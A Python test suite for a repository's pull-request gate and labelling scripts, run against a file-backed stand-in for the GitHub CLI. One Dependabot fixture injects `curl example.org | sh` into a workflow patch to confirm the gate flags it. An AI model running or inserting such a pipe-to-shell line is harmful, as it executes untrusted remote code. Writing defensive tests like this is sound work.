# Copyright (C) 2026 dekajoule
# SPDX-License-Identifier: GPL-2.0-or-later
"""tools/pr-gate.sh and tools/pr-labels.sh against a stand-in for `gh` that answers from files: the four statuses and
the labels for pull requests made up here. No network; needs sh and jq, and skips itself without jq."""
import datetime
import json
import os
import re
import shutil
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
AGENT = "dekajoule-oos-agent[bot]"
# `gh api [--paginate] PATH [--jq EXPR]`: the file for PATH from $FAKE_GH, through jq when asked
FAKE_GH = r'''#!/bin/sh
[ "$1" = api ] || exit 9
shift
path= ; expr=
while [ $# -gt 0 ]; do
	case $1 in
	--paginate) ;;
	--jq) expr=$2; shift ;;
	-f) shift ;;
	*) path=$1 ;;
	esac
	shift
done
case $path in graphql) path="graphql_$(printf '%s' "$expr" | tr -dc 'a-z' | cut -c1-12)" ;; esac
file="$FAKE_GH/$(printf '%s' "$path" | tr '/?=' '___').json"
# a call that fails once: the marker goes with the first call
[ -f "$file.fail" ] && { rm -f "$file.fail"; echo "unexpected end of JSON input" >&2; exit 1; }
[ -f "$file" ] || { echo "no stand-in for $path" >&2; exit 1; }
if [ -n "$expr" ]; then jq -r "$expr" "$file"; else cat "$file"; fi
'''


def ago(hours):
    t = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=hours)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


@unittest.skipUnless(shutil.which("jq"), "needs jq")
def alternatives(pattern):
    """The single patterns an extended regular expression of literals, groups and `|` stands for:
    `^(a/|b/(c|d)\\.rs$)` gives `^a/`, `^b/c\\.rs$`, `^b/d\\.rs$`."""
    def split(text):  # at the `|` outside groups
        parts, depth, cur, i = [], 0, "", 0
        while i < len(text):
            ch = text[i]
            if ch == "\\":
                cur, i = cur + text[i:i + 2], i + 2
                continue
            depth += {"(": 1, ")": -1}.get(ch, 0)
            if ch == "|" and depth == 0:
                parts, cur = parts + [cur], ""
            else:
                cur += ch
            i += 1
        return parts + [cur]

    def expand(text):
        out = []
        for part in split(text):
            start = next((i for i, ch in enumerate(part) if ch == "(" and (i == 0 or part[i - 1] != "\\")), None)
            if start is None:
                out.append(part)
                continue
            depth, end = 0, start
            for end in range(start, len(part)):
                if part[end] in "()" and part[end - 1] != "\\":
                    depth += 1 if part[end] == "(" else -1
                    if depth == 0:
                        break
            inners, rests = expand(part[start + 1:end]), expand(part[end + 1:])
            out += [part[:start] + inner + rest for inner in inners for rest in rests]
        return out

    return expand(pattern)


class PullRequests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="oos-pr-"))
        self.addCleanup(shutil.rmtree, self.dir)
        gh = self.dir / "bin" / "gh"
        gh.parent.mkdir()
        gh.write_text(FAKE_GH)
        gh.chmod(gh.stat().st_mode | stat.S_IXUSR)

    def pull(self, files, author="owner", fork=False, hours=1, labels=(), reviews=(), title="UI: something", bot=False,
             patches=None, ref="topic", draft=False, body=""):
        name = lambda path: self.dir / (path.replace("/", "_").replace("?", "_").replace("=", "_") + ".json")
        pr = {"head": {"sha": "abc", "ref": ref, "repo": {"full_name": "other/oos" if fork else "owner/oos"}},
              "draft": draft, "body": body,
              "base": {"repo": {"full_name": "owner/oos"}}, "user": {"login": author, "type": "Bot" if bot else "User"},
              "labels": [{"name": l} for l in labels], "created_at": ago(hours), "title": title}
        name("repos/owner/oos/pulls/7").write_text(json.dumps(pr))
        entries = [{"filename": f, "patch": (patches or {}).get(f, "+x")} for f in files]
        name("repos/owner/oos/pulls/7/files").write_text(json.dumps(entries))
        name("repos/owner/oos/pulls/7/reviews").write_text(json.dumps(
            [{"user": {"login": who}, "state": state, "commit_id": sha} for who, state, sha in reviews]))
        self.copilot(None)

    def copilot(self, body, open_threads=0, effort="lite", commit="abc"):
        """Copilot's review of pull request 7: its overview text (None: no review yet) and its unresolved threads."""
        name = lambda path: self.dir / (path.replace("/", "_").replace("?", "_").replace("=", "_") + ".json")
        reviews = json.loads(name("repos/owner/oos/pulls/7/reviews").read_text())
        reviews = [r for r in reviews if not r.get("is_copilot_code_review")]
        if body is not None:
            reviews.append({"user": {"login": "copilot-pull-request-reviewer[bot]"}, "state": "COMMENTED",
                            "commit_id": commit, "is_copilot_code_review": True, "copilot_code_review_effort": effort,
                            "body": body})
        name("repos/owner/oos/pulls/7/reviews").write_text(json.dumps(reviews))
        threads = [{"isResolved": i >= open_threads, "comments": {"nodes": [{"author": {"login": "Copilot"}}]}}
                   for i in range(open_threads + 1)]
        threads.append({"isResolved": False, "comments": {"nodes": [{"author": {"login": "someone"}}]}})
        # the stand-in files the graphql query under the first twelve letters of the jq expression
        name("graphql_datareposito").write_text(json.dumps(
            {"data": {"repository": {"pullRequest": {"reviewThreads": {"nodes": threads}}}}}))

    def ci(self, compare="success", kept=False, scope=None, differs=False, calibrated=False):
        """The run of CI for the commit abc: the conclusions of its jobs compare and scope (None: did not run), and
        whether they kept what differed."""
        name = lambda path: self.dir / (path.replace("/", "_").replace("?", "_").replace("=", "_") + ".json")
        name("repos/owner/oos/actions/runs?head_sha=abc&event=pull_request&per_page=20").write_text(json.dumps(
            {"workflow_runs": [{"id": 5, "name": "Gate"}, {"id": 9, "name": "CI"}]}))
        name("repos/owner/oos/actions/runs/9/jobs?per_page=100").write_text(json.dumps(
            {"jobs": [{"name": "test", "conclusion": "success"}, {"name": "compare", "conclusion": compare},
                      {"name": "scope", "conclusion": scope or "skipped"}]}))
        name("repos/owner/oos/actions/runs/9/artifacts").write_text(json.dumps(
            {"artifacts": [{"name": n} for n, keep in (("compare-base", kept), ("scope-binaries-differ", differs),
                                                         ("compare-calibrated", calibrated)) if keep]}))

    def run_tool(self, tool, tries="1", ok=True):
        env = dict(os.environ, PATH=f"{self.dir / 'bin'}:{os.environ['PATH']}", FAKE_GH=str(self.dir),
                   OOS_REPO="owner/oos", OOS_API_TRIES=tries, OOS_API_WAIT="0")
        out = subprocess.run(["sh", str(ROOT / "tools" / tool), "--dry", "7"], env=env, capture_output=True, text=True)
        self.assertEqual(out.returncode == 0, ok, out.stderr)
        return out.stdout

    def gate(self):
        return {l.split()[0]: l.split()[1] for l in self.run_tool("pr-gate.sh").splitlines()}

    def labels(self):
        return set(self.run_tool("pr-labels.sh").split(":", 1)[1].split())

    def test_the_wait(self):
        self.pull(["ui/src/ui.rs"], author="someone", hours=1)
        self.assertEqual(self.gate()["waited"], "pending")
        self.pull(["ui/src/ui.rs"], author="someone", hours=25)
        self.assertEqual(self.gate()["waited"], "success")
        self.pull(["ui/src/ui.rs", "docs/adr/process/0099-x.md"], author="someone", hours=25)
        self.assertEqual(self.gate()["waited"], "pending", "a decision record waits 72 hours")
        self.pull(["docs/adr/README.md"], author="someone", hours=25)
        self.assertEqual(self.gate()["waited"], "success", "the index alone is no decision record")
        self.pull(["docs/adr/process/0099-x.md"], author="someone", hours=1, labels=["no-wait"])
        self.assertEqual(self.gate()["waited"], "success")

    def test_no_wait_for_the_maintainers_own(self):
        self.pull(["hal/src/dho/seq.rs", "docs/adr/process/0099-x.md", ".github/workflows/ci.yml"])
        self.assertEqual(self.gate()["waited"], "success", "the maintainer's own, whatever it touches")
        self.pull(["ui/src/ui.rs"], author="owner", fork=True)
        self.assertEqual(self.gate()["waited"], "pending", "from a fork, under the maintainer's name")
        self.pull(["hal/src/dho/seq.rs", ".github/workflows/ci.yml"], author=AGENT, bot=True)
        self.assertEqual(self.gate()["waited"], "success", "the development agent's, whatever it touches")
        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, fork=True)
        self.assertEqual(self.gate()["waited"], "pending", "from a fork, under the agent's name")
        self.pull(["ui/src/ui.rs"], author="someone")
        self.assertEqual(self.gate()["waited"], "pending", "somebody else's, 24 hours")

    def test_no_wait_when_it_is_proven(self):
        unchanged = "**What changes:** x\n\n**Behaviour:** unchanged.\n"
        self.pull(["README.md", "docs/boot.md", "wiki/Home.md"], author="someone")
        self.assertEqual(self.gate()["waited"], "success", "documents only")
        for path in ("docs/adr/process/0099-x.md", "AGENTS.md", "CONTRIBUTING.md"):
            self.pull(["README.md", path], author="someone")
            self.assertEqual(self.gate()["waited"], "pending", f"{path} is a rule, not a document to correct")
        self.ci()
        self.pull(["ui/src/ui.rs", "dsp/src/x.rs", "tools/tests/test_x.py"], author="someone", body=unchanged)
        self.assertEqual(self.gate()["waited"], "success", "unchanged, and the comparison found nothing")
        self.pull(["ui/src/ui.rs"], author="someone", body="**Behaviour:** changed: the menu")
        self.assertEqual(self.gate()["waited"], "pending", "it does not say unchanged")
        self.ci(kept=True)
        self.pull(["ui/src/ui.rs"], author="someone", body=unchanged)
        self.assertEqual(self.gate()["waited"], "pending", "the comparison kept what differed")
        self.ci(compare="failure")
        self.assertEqual(self.gate()["waited"], "pending", "the comparison failed")
        self.ci(compare=None)
        self.assertEqual(self.gate()["waited"], "pending", "the comparison has not run yet")
        self.ci()
        for path in ("hal/src/dho/seq.rs", ".github/workflows/ci.yml", "tools/check.sh", "ui/tools/layout-check.sh"):
            self.pull(["ui/src/ui.rs", path], author="someone", body=unchanged)
            self.assertEqual(self.gate()["waited"], "pending", f"{path} is not seen by the comparison")

    def test_a_failed_call_is_tried_again(self):
        self.pull(["ui/src/ui.rs"])
        self.copilot("### Looks good\n\n**No open issues** 🎉\n")
        fail = lambda: (self.dir / "repos_owner_oos_pulls_7.json.fail").write_text("")
        fail()
        self.run_tool("pr-gate.sh", tries="1", ok=False)
        fail()
        gate = {l.split()[0]: l.split()[1] for l in self.run_tool("pr-gate.sh", tries="2").splitlines()}
        self.assertEqual(gate["review"], "success", "the second try reads the pull request")

    def test_the_review(self):
        self.pull(["ui/src/ui.rs"], draft=True)
        self.assertEqual(self.gate()["review"], "pending", "a draft has no review yet")
        self.pull(["ui/src/ui.rs"])
        self.assertEqual(self.gate()["review"], "pending", "no review yet")
        self.copilot("### Looks good\n\n**No open issues** 🎉\n")
        self.assertEqual(self.gate()["review"], "success")
        self.copilot("### Needs a closer look\n\n**2 open issues**\n", open_threads=2)
        self.assertEqual(self.gate()["review"], "pending", "open comments")
        self.copilot("### Needs a closer look\n\n**2 open issues**\n", open_threads=0)
        self.assertEqual(self.gate()["review"], "success", "every comment of Copilot's resolved; others' do not count")
        self.copilot("### Looks good\n\n**No open issues** 🎉\n", commit="older")
        self.assertEqual(self.gate()["review"], "success", "one review per pull request, of whichever commit")
        self.copilot("### Needs a closer look\n\n**2 open issues**\n", open_threads=0)
        (self.dir / "graphql_datareposito.json").unlink()
        self.assertEqual(self.gate()["review"], "pending", "threads that could not be read are not none")

    def test_hold(self):
        self.pull(["ui/src/ui.rs"], labels=["hold"])
        self.assertEqual(self.gate()["owner"], "pending", "the maintainer's own, held")
        self.pull(["ui/src/ui.rs"], labels=["holder"])
        self.assertEqual(self.gate()["owner"], "success", "only the label hold")

    def test_whose_it_is(self):
        self.pull(["ui/src/ui.rs"])
        self.assertEqual(self.gate()["owner"], "success", "the maintainer's own")
        self.pull(["ui/src/ui.rs"], author="owner", fork=True)
        self.assertEqual(self.gate()["owner"], "pending", "from a fork, whatever the name")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True)
        self.assertEqual(self.gate()["owner"], "pending")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("owner", "APPROVED", "abc")])
        self.assertEqual(self.gate()["owner"], "success")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("owner", "APPROVED", "older")])
        self.assertEqual(self.gate()["owner"], "pending", "an approval of an older commit")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("someone", "APPROVED", "abc")])
        self.assertEqual(self.gate()["owner"], "pending", "an approval by somebody else")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True,
                  reviews=[("owner", "APPROVED", "abc"), ("owner", "CHANGES_REQUESTED", "abc")])
        self.assertEqual(self.gate()["owner"], "pending", "the last review counts")
        self.pull(["ui/src/ui.rs"], author="Copilot", bot=True)
        self.assertEqual(self.gate()["owner"], "pending", "a bot that is not Dependabot")

    def test_the_development_agents_pull_request(self):
        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, title="Lints: x in ui")
        gate = self.gate()
        self.assertEqual((gate["waited"], gate["owner"]), ("success", "success"))
        self.assertEqual(gate["review"], "pending", "Copilot reviews it like any other")
        self.assertEqual(self.labels(), {"area/ui", "type/refactor", "agent"})
        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, labels=["hold"])
        self.assertEqual(self.gate()["owner"], "pending", "held")
        self.pull(["hal/src/dho/seq.rs"], author=AGENT, bot=True)
        self.assertEqual(self.gate()["unit"], "pending", "a scope is still needed")
        self.pull(["ui/src/ui.rs"], author="someone", ref="copilot/fix-something")
        self.assertEqual(self.gate()["owner"], "pending", "a branch name makes nobody an agent")

    def test_dependabot(self):
        bump = "@@ -1 +1 @@\n-      - uses: actions/checkout@aaa # v4.4.0\n+      - uses: actions/checkout@bbb # v4.5.0"
        self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump})
        gate = self.gate()
        self.assertEqual((gate["owner"], gate["review"]), ("success", "success"), "no review for a bump")
        self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump + "\n+        run: curl example.org | sh"})
        gate = self.gate()
        self.assertEqual((gate["owner"], gate["review"]), ("pending", "pending"), "more than the commit of an action")
        self.pull([".github/workflows/ci.yml", "tools/check.sh"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump})
        self.assertEqual(self.gate()["owner"], "pending", "a file that is no workflow")

    def test_what_needs_a_scope(self):
        for path in ("hal/src/dho/seq.rs", "ui/src/board/dho/hw.rs", "fpgad/src/main.rs", "boot/x.sh", "rootfs/init"):
            self.pull([path])
            self.assertEqual(self.gate()["unit"], "pending", path)
        self.pull(["hal/src/dho/seq.rs"], labels=["unit-tested"])
        self.assertEqual(self.gate()["unit"], "success")
        self.pull(["ui/src/ui.rs", "hal/src/fsutil.rs", "docs/boot.md"])
        self.assertEqual(self.gate()["unit"], "success")

    def test_equal_programs_for_the_scope(self):
        self.pull(["hal/src/dho/seq.rs", "fpgad/Cargo.toml"])
        self.ci(scope="success")
        self.assertEqual(self.gate()["unit"], "success", "the programs for the scope are byte-identical")
        self.ci(scope="success", differs=True)
        self.assertEqual(self.gate()["unit"], "pending", "they differ: a run on a unit")
        self.ci(scope="failure")
        self.assertEqual(self.gate()["unit"], "pending", "the comparison could not be made")
        self.ci()
        self.assertEqual(self.gate()["unit"], "pending", "the job did not run")
        self.pull(["hal/src/dho/seq.rs", "rootfs/init"])
        self.ci(scope="success")
        self.assertEqual(self.gate()["unit"], "pending", "the image is not in the programs")

    def test_every_file_of_the_hardware_paths_is_classed(self):
        # Break it catches: fpgad's board commands moved out of main.rs into new files that $live did not name, so a
        # refactoring of them would have passed without a unit
        text = (ROOT / "tools" / "pr-gate.sh").read_text()
        assign = "".join(line + "\n" for line in text.split("\n") if re.match(r"(hardware|live|proven)=", line))
        out = subprocess.run(["sh", "-c", assign + 'printf "%s\\n" "$hardware" "$live" "$proven"'],
                             capture_output=True, text=True, check=True).stdout.split("\n")
        hardware, live, proven = (re.compile(p) for p in out[:3])
        files = subprocess.run(["git", "ls-files"], cwd=ROOT, capture_output=True, text=True, check=True).stdout.split()
        files = [f for f in files if hardware.search(f)]
        self.assertGreater(len(files), 100, "the tree's hardware paths")
        self.assertEqual([f for f in files if not live.search(f) and not proven.search(f)], [],
                         "in neither $live nor $proven of tools/pr-gate.sh: class it")
        self.assertEqual([f for f in files if live.search(f) and proven.search(f)], [], "in both")
        # every alternative of both lists names something in the tree: a renamed or removed file leaves no stale name
        for name, pattern in (("$live", live.pattern), ("$proven", proven.pattern)):
            stale = [a for a in alternatives(pattern) if not any(re.search(a, f) for f in files)]
            self.assertEqual(stale, [], f"named in {name}, not in the tree")

    def test_a_refactoring_the_comparison_found_equal(self):
        unchanged = "**Behaviour:** unchanged.\n"
        regs = ["hal/src/dho/tpu.rs", "hal/src/dho/seq.rs", "fpgad/src/compcheck.rs"]
        self.ci(calibrated=True)
        self.pull(regs, title="Lints: the findings in the trigger code", body=unchanged)
        self.assertEqual(self.gate()["unit"], "success", "register sequences, which the comparison proves")
        self.pull(regs, title="Refactor: one table for the trigger types", body=unchanged)
        self.assertEqual(self.gate()["unit"], "success")
        self.pull(regs, title="Trigger: a new mode", body=unchanged)
        self.assertEqual(self.gate()["unit"], "pending", "not a refactoring by its title")
        self.pull(regs, title="Lints: x", body="**Behaviour:** changed")
        self.assertEqual(self.gate()["unit"], "pending", "it does not say unchanged")
        for live in ("ui/src/board/dho/hw.rs", "hal/src/dho/bus.rs", "hal/src/dho/roll.rs", "hal/src/dho/selfcal.rs",
                     "hal/src/dho/boot/mod.rs", "hal/src/update/pkg.rs", "fpgad/src/bin/oos-update.rs",
                     "fpgad/src/main.rs", "fpgad/src/board.rs", "rootfs/init", "hal/src/dho/seq/exec.rs"):
            self.pull(regs + [live], title="Refactor: x", body=unchanged)
            self.assertEqual(self.gate()["unit"], "pending", f"{live}: timing, start or update need a unit")
        self.pull(["rust-toolchain.toml"], title="Refactor: x", body=unchanged)
        self.assertEqual(self.gate()["unit"], "pending", "another compiler builds other programs for the scope")
        self.pull(regs + ["hal/src/dho/a_new_file.rs"], title="Refactor: x", body=unchanged)
        self.assertEqual(self.gate()["unit"], "pending", "a file of the hardware paths that is not classed yet")
        self.ci()
        self.pull(regs, title="Lints: x", body=unchanged)
        self.assertEqual(self.gate()["unit"], "pending", "compared without calibration values")
        self.ci(kept=True, calibrated=True)
        self.pull(regs, title="Lints: x", body=unchanged)
        self.assertEqual(self.gate()["unit"], "pending", "the comparison found a difference")
        self.ci(compare=None)
        self.assertEqual(self.gate()["unit"], "pending", "the comparison has not run")

    def test_labels(self):
        self.pull(["hal/src/dho/seq.rs", "docs/protocols/trigger.md", "tools/check.sh"], title="Trigger: something")
        self.assertEqual(self.labels(), {"area/hal", "area/docs", "area/tooling", "risk/hardware"})
        self.pull([".github/workflows/ci.yml", "README.md"], title="CI: something", author="dependabot[bot]", bot=True)
        self.assertEqual(self.labels(), {"area/ci", "area/docs", "type/ci", "agent"})
        self.pull(["ui/src/scpi.rs"], title="Tests: something")
        self.assertEqual(self.labels(), {"area/ui", "type/test"})
        self.pull(["wiki/Home.md"], title="Docs: something")
        self.assertEqual(self.labels(), {"area/docs", "type/docs"})
        self.pull(["rust-toolchain.toml"], title="CI: something")
        self.assertIn("risk/hardware", self.labels(), "the compiler builds every program for the scope")


if __name__ == "__main__":
    unittest.main()
